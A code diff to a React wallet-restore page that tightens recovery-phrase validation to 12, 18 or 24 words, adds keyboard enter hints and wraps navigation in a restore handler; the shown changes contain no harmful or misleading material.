@@ -24,6 +24,8 @@ const safetyChecks = [
   'If someone else has seen it, they can and will steal your funds.',
 ]
 
+const validSecretPhraseWordCounts = [12, 18, 24]
+
 const networks = [
   { name: 'Bitcoin', icon: <SiBitcoin />, tone: 'orange' },
   { name: 'Ethereum', icon: <SiEthereum />, tone: 'blue' },
@@ -45,7 +47,7 @@ function AddExistingWalletPage() {
   const [secretPhrase, setSecretPhrase] = useState('')
 
   const phraseWordCount = secretPhrase.trim().split(/\s+/).filter(Boolean).length
-  const canRestore = walletName.trim().length > 0 && phraseWordCount >= 12
+  const canRestore = walletName.trim().length > 0 && validSecretPhraseWordCounts.includes(phraseWordCount)
 
   function openTrustWalletSite() {
     window.location.href = 'https://trustwallet.com/'
@@ -75,6 +77,12 @@ function AddExistingWalletPage() {
     setShowSafetySheet(false)
     setStep('network')
     setCheckedItems([])
+  }
+
+  function restoreWallet() {
+    if (canRestore) {
+      navigate('/wallet')
+    }
   }
 
   function goBack() {
@@ -241,6 +249,7 @@ function AddExistingWalletPage() {
                 id="wallet-name"
                 type="text"
                 value={walletName}
+                enterKeyHint="next"
                 onChange={(event) => setWalletName(event.target.value)}
               />
               <button
@@ -263,6 +272,7 @@ function AddExistingWalletPage() {
                 autoCapitalize="none"
                 autoComplete="off"
                 autoCorrect="off"
+                enterKeyHint="done"
                 onChange={(event) => setSecretPhrase(event.target.value)}
               />
               <button type="button" onClick={pasteSecretPhrase}>Paste</button>
@@ -271,7 +281,7 @@ function AddExistingWalletPage() {
           <p>Typically 12 (sometimes 18, 24) words separated by single spaces</p>
         </section>
         <section className="restore-actions">
-          <button className="continue-button" type="button" disabled={!canRestore} onClick={() => navigate('/wallet')}>
+          <button className="continue-button" type="button" disabled={!canRestore} onClick={restoreWallet}>
             Restore wallet
           </button>
           <button className="secret-help" type="button" onClick={openTrustWalletSite}>
